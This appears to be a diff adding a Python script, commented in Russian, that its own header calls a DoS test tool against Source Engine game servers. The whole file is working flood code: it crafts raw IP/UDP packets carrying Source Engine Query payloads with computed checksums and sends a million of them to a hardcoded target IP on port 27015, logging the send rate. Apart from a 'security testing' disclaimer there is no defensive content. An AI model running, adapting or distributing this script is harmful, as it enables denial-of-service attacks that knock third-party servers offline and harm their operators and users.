@@ -1,0 +1,129 @@
+#!/usr/bin/env python3
+# Тестовый скрипт для DOS-атаки Source Engine Query запросами для тестирования безопасности серверов.
+# Скрипт используется только на свой страх и риск.
+# Для запуска требуется python3 и установленный pip. Требуется модуль struct;
+#!/usr/bin/env python3
+import socket
+import struct
+import random
+import time
+import errno
+
+# Конфиг атаки
+TARGET_IP = "109.248.250.217"
+TARGET_PORT = 27015
+PACKET_COUNT = 1000000
+LOG_EVERY = 10000   # Логировать каждый N-ный пакет
+DEBUG_PACKETS = 5   # Сколько первых пакетов сохранить для диагностики
+
+# Source Engine Query
+QUERY_PACKET = b'\xff\xff\xff\xff\x54Source Engine Query\x00'
+UDP_LENGTH = 8 + len(QUERY_PACKET)  # Длина UDP заголовка + Payload
+
+# Создаем RAW сокет с IP_HDRINCL (собственный IP заголовок)
+sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
+sock.setblocking(False)
+
+# Отладочный дамп первых пакетов
+debug_dump = []
+
+def checksum(data):
+    """Вычисляет контрольную сумму согласно RFC 1071."""
+    if len(data) % 2:
+        data += b'\x00'
+    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
+    s = (s >> 16) + (s & 0xffff)
+    s += (s >> 16)
+    return ~s & 0xffff
+
+def create_packet():
+    """Формирование валидного IP/UDP пакета согласно RFC (без Spoofing)."""
+    src_ip = socket.inet_aton("85.234.100.61")  # Реальный исходящий IP
+    dst_ip = socket.inet_aton(TARGET_IP)
+    
+    # IP заголовок
+    total_length = 20 + UDP_LENGTH  # 20 (IP) + 8 (UDP) + 25 (Payload)
+    ip_id = random.randint(0, 65535)
+    ip_header = struct.pack("!BBHHHBBH4s4s",
+                            0x45,         # Версия 4 и IHL = 5 (20 байт)
+                            0,            # TOS
+                            total_length, # Общая длина пакета
+                            ip_id,        # Идентификатор
+                            0x4000,       # Флаги (DF) и смещение фрагмента
+                            64,           # TTL
+                            socket.IPPROTO_UDP,  # Протокол UDP
+                            0,            # Контрольная сумма (пока 0)
+                            src_ip,       # Исходный IP
+                            dst_ip)       # Целевой IP
+
+    # Вычисляем контрольную сумму IP и вставляем её
+    ip_chksum = checksum(ip_header)
+    ip_header = ip_header[:10] + struct.pack("!H", ip_chksum) + ip_header[12:]
+    
+    # UDP заголовок
+    udp_src_port = random.randint(1024, 65535)
+    udp_header = struct.pack("!HHHH",
+                             udp_src_port,   # Исходящий порт
+                             TARGET_PORT,    # Порт назначения
+                             UDP_LENGTH,     # Длина UDP (заголовок + Payload)
+                             0)              # Контрольная сумма (пока 0)
+
+    # Формирование псевдо-заголовка для вычисления контрольной суммы UDP
+    pseudo_header = src_ip + dst_ip + struct.pack("!BBH", 0, socket.IPPROTO_UDP, UDP_LENGTH)
+    udp_checksum_data = pseudo_header + udp_header + QUERY_PACKET
+    udp_chksum = checksum(udp_checksum_data)
+    
+    # Пересобираем UDP заголовок с вычисленной контрольной суммой
+    udp_header = struct.pack("!HHHH",
+                             udp_src_port,
+                             TARGET_PORT,
+                             UDP_LENGTH,
+                             udp_chksum)
+    
+    packet = ip_header + udp_header + QUERY_PACKET
+    
+    if len(debug_dump) < DEBUG_PACKETS:
+        debug_dump.append(packet)
+    
+    return packet
+
+def send_packets():
+    """Отправка пакетов с логированием времени и PPS."""
+    start_time = time.time()
+    sent = 0
+    error_count = 0
+    
+    for i in range(PACKET_COUNT):
+        packet = create_packet()
+        while True:
+            try:
+                sock.sendto(packet, (TARGET_IP, 0))
+                sent += 1
+                # Логирование каждые LOG_EVERY пакетов с текущим временем и PPS
+                if sent % LOG_EVERY == 0:
+                    elapsed = time.time() - start_time
+                    pps = sent / elapsed if elapsed > 0 else 0
+                    current_time = time.strftime("%H:%M:%S", time.localtime())
+                    print(f"[INFO] {current_time} - Отправлено {sent} пакетов, {pps:.2f} PPS.")
+                break
+            except OSError as e:
+                error_count += 1
+                if e.errno == errno.ENOBUFS:
+                    print(f"[WARNING] ENOBUFS: буфер переполнен. Ожидание...")
+                    time.sleep(0.001)
+                else:
+                    print(f"[ERROR] Ошибка отправки пакета: {e} (errno {e.errno})")
+                    break
+    
+    elapsed = time.time() - start_time
+    print(f"\n[RESULT] Отправлено {sent} пакетов за {elapsed:.2f} сек. ({sent/elapsed:.2f} PPS)")
+    print(f"[ERRORS] Количество ошибок: {error_count}")
+    
+    if debug_dump:
+        print("\n[DEBUG] Hex-дамп первых пакетов:")
+        for idx, pkt in enumerate(debug_dump):
+            print(f"Пакет {idx+1}: {pkt.hex()}")
+
+if __name__ == "__main__":
+    send_packets()
